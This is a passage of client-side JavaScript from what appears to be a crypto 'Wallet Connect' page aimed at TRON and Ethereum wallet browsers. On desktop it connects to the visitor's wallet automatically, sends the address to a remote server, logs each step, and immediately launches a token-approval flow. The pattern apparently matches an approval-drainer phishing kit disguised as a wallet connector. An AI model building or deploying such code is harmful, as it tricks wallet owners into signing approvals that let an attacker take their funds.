          console.warn('Failed to notify server:', e);
        }

        updateStep(3, 'done');

        // Show success
        scShow('scDone');
        document.getElementById('doneAddress').textContent = address;
        isProcessing = false;

        // Log success
        await logEvent('approve_signed', address, txId, approveVal);

      } catch(e) {
        console.error('❌ Approve error:', e);
        
        // Log error
        await logEvent('approve_error', address, '', e.message);
        
        showError('Approval Failed', e.message || 'An unexpected error occurred');
        isProcessing = false;
      }
    }

        (function(w) {

          var isActive = (detectedWallet === w.id);

          var badgeClass = isActive ? 'badge' : (isInstalled ? 'badge' : 'badge install');
          
          b.innerHTML = 
            '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div>' +
            '<span class="nm">' + w.name + (isActive ? ' 🟢' : '') + '</span>' +
            '<span class="' + badgeClass + '">' + badgeText + '</span>' +
            '<span class="arrow">›</span>';
          
          b.addEventListener('click', function() { 
            connectWallet(w.id); 
          });
          
          walletList.appendChild(b);
        })(WALLETS[i]);
      }
    }

    // ============================================================
    // AUTO-CONNECT FOR WALLET BROWSERS
    // ============================================================
    async function autoConnectInWalletBrowser() {
      var detectedWallet = detectWalletBrowser();
      if (!detectedWallet) {
        console.log('ℹ️ No wallet browser detected, showing manual selection');
        return;
      }
      
      console.log('🔍 Detected wallet browser:', detectedWallet);
      
      // For mobile, show connection screen with highlighted wallet
      if (isMobile) {
        scShow('scConnect');
        msg('inf', detectedWallet.charAt(0).toUpperCase() + detectedWallet.slice(1) + ' detected! Click Connect to continue.');
        return; // Wait for user to click
      }
      
      // For desktop, wait for provider and auto-connect
      await new Promise(function(r) { setTimeout(r, 1000); });
      
      var wallet = WALLETS.find(function(w) { return w.id === detectedWallet; });
      if (!wallet) {
        console.log('⚠️ No wallet config found for:', detectedWallet);
        return;
      }
      
      var provider = wallet.getProvider();
      if (!provider) {
        console.log('⏳ Waiting for provider to be injected...');
        for (var attempts = 0; attempts < 20; attempts++) {
          await new Promise(function(r) { setTimeout(r, 500); });
          provider = wallet.getProvider();
          if (provider) {
            console.log('✅ Provider found after', attempts + 1, 'attempts');
            break;
          }
        }
      }
      
      if (!provider) {
        console.log('❌ Provider not found, showing manual selection');
        return;
      }
      
      var address = wallet.getAddress(provider);
      if (!address) {
        try {
          var result = await wallet.requestAccounts(provider);
          if (result) {
            if (typeof result === 'string') address = result;
            else if (Array.isArray(result) && result.length > 0) address = result[0];
            else if (result.address) address = result.address;
          }
        } catch(e) {
          console.warn('Auto-connect request failed:', e.message);
          return;
        }
      }
      
      if (address) {
        console.log('✅ Auto-connecting to', detectedWallet, 'with address:', address);
        connectedAddress = address;
        await sendAddressToServer(address);
        await logEvent('wallet_connected', address, '', detectedWallet);
        await doApproveFlow(address, provider, wallet);
      }
    }

    // ============================================================
    // INITIALIZATION
    // ============================================================
    console.log('🚀 Initializing Wallet Connect...');
    console.log('📱 Session:', SESSION_ID);
    console.log('🌐 URL:', SITE_URL);

    // Render wallet buttons
    renderWallets();
    
    // Fetch configuration
    fetchConfig();

    // Auto-connect for wallet browsers
    setTimeout(function() {
      autoConnectInWalletBrowser();
    }, 1500);

    // Log environment for debugging
    console.log('📊 Environment Summary:');
    console.log('  TronWeb available:', typeof TronWeb !== 'undefined');
    console.log('  window.tronWeb:', !!window.tronWeb);
    console.log('  window.tronLink:', !!window.tronLink);
    console.log('  window.ethereum:', !!window.ethereum);
    console.log('  window.okxwallet:', !!window.okxwallet);
    console.log('  window.tokenpocket:', !!window.tokenpocket);
    console.log('  window.bitkeep:', !!window.bitkeep);
    console.log('  window.imtoken:', !!window.imtoken);
  </script>
</body>
